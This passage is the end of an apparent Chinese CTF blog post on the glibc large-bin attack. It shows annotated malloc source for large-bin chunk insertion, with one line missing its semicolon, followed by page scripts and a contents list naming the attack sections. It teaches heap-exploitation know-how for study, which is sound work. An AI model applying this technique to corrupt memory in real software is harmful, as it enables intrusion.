+</span></span><span class="line"><span class="cl">      <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="c1">// 在 large bin 中顺序查找符合请求大小的块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">assert</span> <span class="p">(</span><span class="nf">chunk_main_arena</span> <span class="p">(</span><span class="n">fwd</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="k">while</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">assert</span> <span class="p">(</span><span class="nf">chunk_main_arena</span> <span class="p">(</span><span class="n">fwd</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 总是将 victim 插入到第二个位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="c1">// 插入到适当的位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">// 更新 bck
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (bk)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="c1">// 该 large bin 中一个空闲块也没有
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 将该 bin 标记为非空闲状态
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mark_bin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 将 victim 插入到 bck 和 fwd 之间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span>
+</span></span><span class="line"><span class="cl"><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span></code></pre></div>
+  <style>
+  .button {
+            font-family: 宋体,'Comic Sans MS', cursive;
+            color: #FFFFFF;
+            background-color: #333333;
+            display: inline-block;
+            white-space: nowrap;
+            height: 40px;
+            min-width: 230px;
+            line-height: 42px;
+            margin: 0 5px 0 0;
+            padding: 0 22px;
+            text-decoration: none;
+             
+            text-align: center;
+            font-weight: medium;
+            font-style: normal;
+            font-size: 14px;
+            cursor: pointer;
+            border: 0;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+            -webkit-border-radius: 4px;
+            vertical-align: top;
+            -webkit-font-smoothing: antialiased;
+            font-smoothing: antialiased;
+        }
+    .button:hover {
+        cursor: pointer;
+        animation: jelly 0.7s;
+    }
+ 
+    @keyframes jelly {
+ 
+        0%,
+        100% {
+            transform: scale(0.1, 0.1);
+        }
+ 
+        33% {
+            transform: scale(0.05, 0.15);
+        }
+ 
+        66% {
+            transform: scale(0.15, 0.05);
+        }
+    }
+ 
+    @keyframes jelly {
+ 
+        0%,
+        100% {
+            transform: scale(1, 1);
+        }
+ 
+        25%,
+        75% {
+            transform: scale(0.9, 1.1);
+        }
+ 
+        50% {
+            transform: scale(1.1, 0.9);
+        }
+    }
+</style>
+<a href="/subscribe/"><button class="button">点此订阅P3troL1er的博客！</button></a> <br />  
+</article>
+
+
+      
+        <div class="my-4">
+    
+    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
+    
+    <a href="https://peterliuzhi.top/tags/largebin/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#largebin</a>
+    
+    <a href="https://peterliuzhi.top/tags/heap/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#heap</a>
+    
+</div>
+      
+
+      
+  <div class="flex md:justify-end my-4">
+
+    <a href="https://github.com/PeterLiu-all/peterliu-all.github.io/content/principle/Largebin_Attack.md" title="Edit this page">
+      <i class="fas fa-edit me-1"></i>
+      <span>编辑本页</span>
+    </a>
+  </div>
+
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+        <span class="text-primary-text block font-bold">下一页</span>
+        <a href="https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/introduction/deeplearning%E4%BB%8B%E7%BB%8D/" class="block">DeepLearning介绍</a>
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+  
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "peterliuzhi" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>本页内容</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#large-bin的数据结构">Large bin的数据结构</a>
+      <ul>
+        <li><a href="#何时会进入large-bin中">何时会进入large bin中？</a>
+          <ul>
+            <li><a href="#测试程序1">测试程序1</a></li>
+            <li><a href="#调试程序2">调试程序2</a></li>
+          </ul>
+        </li>
+        <li><a href="#large-bin的结构">large bin的结构？</a></li>
+      </ul>
+    </li>
+    <li><a href="#large-bin-attack基本原理概述">Large bin Attack基本原理概述</a></li>
+    <li><a href="#例子解释230以前">例子解释（2.30以前）</a></li>
+    <li><a href="#例子解释230以后">例子解释（2.30以后）</a></li>
+    <li><a href="#相关源码">相关源码</a></li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+      <div
+        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
+      >
+        <h3>相关</h3>
+        
+          <a href="https://peterliuzhi.top/writeup/sictf-pwn-writeup/" class="no-underline">SICTF PWN WriteUp</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/tricks/linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/" class="no-underline">Linux中常用的分析文件的小工具</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/" class="no-underline">HGame Week2 PWN WriteUp</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/hgame-week1-pwn-writeup/" class="no-underline">HGame Week1 PWN WriteUp</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/tricks/pwntools%E8%B0%83%E7%94%A8gdb%E8%B0%83%E8%AF%95%E6%97%B6%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8binsheap%E7%AD%89%E5%91%BD%E4%BB%A4/" class="no-underline">pwntools调用gdb调试时无法使用bins、heap等命令</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/0ctf_2017_babyheap/" class="no-underline">0ctf_2017_babyheap</a>
+          <br />
+        
+      </div>
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
+
+        &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka"
+            class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io"
+            class="hover:text-eureka">Hugo</a></p>
+</div>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/copy-btn.css">
+<script language="javascript" type="text/javascript" charset="utf-8" src="https://peterliuzhi.top/js/add-copy-btn.js"></script>
+<style>
+    .black-circle {
+        height: 45px;
+        width: 45px;
+        display: block;
+        font-size: 30px;
+        transition: all 1.5s;
+        position: fixed;
+        right: 0px;
+        bottom: 0px;
+        z-index: 100;
+        background: transparent;
+    }
+
+    .black-circle:hover {
+        transform: translateY(-10px);
+    }
+</style>
+<script>
+    function goTop(acceleration, time) {
+        acceleration = acceleration || 0.1;
+        time = time || 16;
+
+        var x1 = 0;
+        var y1 = 0;
+        var x2 = 0;
+        var y2 = 0;
+        var x3 = 0;
+        var y3 = 0;
+
+        if (document.documentElement) {
+            x1 = document.documentElement.scrollLeft || 0;
+            y1 = document.documentElement.scrollTop || 0;
+        }
+        if (document.body) {
+            x2 = document.body.scrollLeft || 0;
+            y2 = document.body.scrollTop || 0;
+        }
+        var x3 = window.scrollX || 0;
+        var y3 = window.scrollY || 0;
+
+        
+        var x = Math.max(x1, Math.max(x2, x3));
+        
+        var y = Math.max(y1, Math.max(y2, y3));
+
+        
+        var speed = 1 + acceleration;
+        window.scrollTo(Math.floor(x / speed), Math.floor(y / speed));
+
+        
+        if (x > 0 || y > 0) {
+            var invokeFunction = goTop(acceleration, time);
+            window.setTimeout(invokeFunction, time);
+        }
+    }
+</script>
+<a><i id="return-top" class="fa-solid fa-circle-up black-circle" onclick="goTop(0.1, 16)"></i></a></div>
+    </footer>
+  </body>
+</html>
